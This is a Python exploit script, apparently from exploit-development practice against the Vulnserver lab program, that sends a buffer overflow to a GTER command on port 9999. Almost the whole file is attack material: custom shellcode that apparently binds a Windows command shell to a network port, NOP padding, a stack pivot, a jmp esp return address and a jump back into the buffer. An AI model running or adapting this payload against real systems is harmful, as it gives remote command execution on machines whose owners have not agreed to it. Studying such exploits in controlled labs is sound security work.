#! /bin/python3

import socket   # The module "socket" provides access to the BSD socket interface
import struct   # The module "struct" performs conversions between Python values and C structs represented as Python bytes objects.
import sys      # The module "sys" provides access to the runtime environment and allows us to gather information about it.

# Check that we have a target IP
if (len(sys.argv) < 2):
    print("This program requires one Command Line Argument. This should be the IPv4 address of the target machine")
    exit(1)

# Set Constants for later use
HOST = sys.argv[1]  # Extract target IP
PORT = 9999         # victim port

# Change! Custom shellcode we manually created and compiled
CUSTOM_SHELL = (
    b'\x31\xdb\x53\x53\x53\xb3\x06\x53\x31\xdb\x43\x53\x43\x53\xbb\xa0\x9b\x1e\x77\xff\xd3\x96\xbb\x5f\x55\x57\x6b\x81\xeb\x55\x55\x55\x55\x53\x66\x68\x11\x5c\x31\xdb\x80\xc3\x02\x66\x53\x89\xe3\x6a\x16\x53\x56\xbb\x80\x69\x1e\x77\xff\xd3\xbb\x41\x63\x6d\x64\xc1\xeb\x08\x53\x89\xe1\x31\xd2\x56\x56\x56\x52\x52\x31\xc0\x66\xb8\x01\x01\x50\x52\x52\x52\x52\x52\x52\x52\x52\x52\x52\x80\xc2\x2c\x52\x89\xe0\x31\xd2\x52\x52\x52\x52\x54\x50\x31\xdb\x53\x53\x53\x43\x53\x4b\x53\x53\x51\x53\xbb\x60\xf9\x94\x75\xff\xd3'
)

# Generate payload, this includes a packed ROP (Encoded)
# so we can change the control flow of the program
PAYLOAD = (
    b'GTER /.:/' +
    b'\x90' * 5 +       # NOP Padding
    b'\x50' +           # PUSH EAX
    b'\x5c' +           # POP ESP
    CUSTOM_SHELL+
    b'A' * (135 - len(CUSTOM_SHELL) - 2 - 5) +
    # jmp esp
    struct.pack('<L', 0x625026D3) +
    # JMP to the start of our buffer
    b'\xe9\x70\xff\xff\xff' +
    b'C' * (400 - 135 - 4 - 5)
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.recv(128)
    fd.sendall(PAYLOAD)
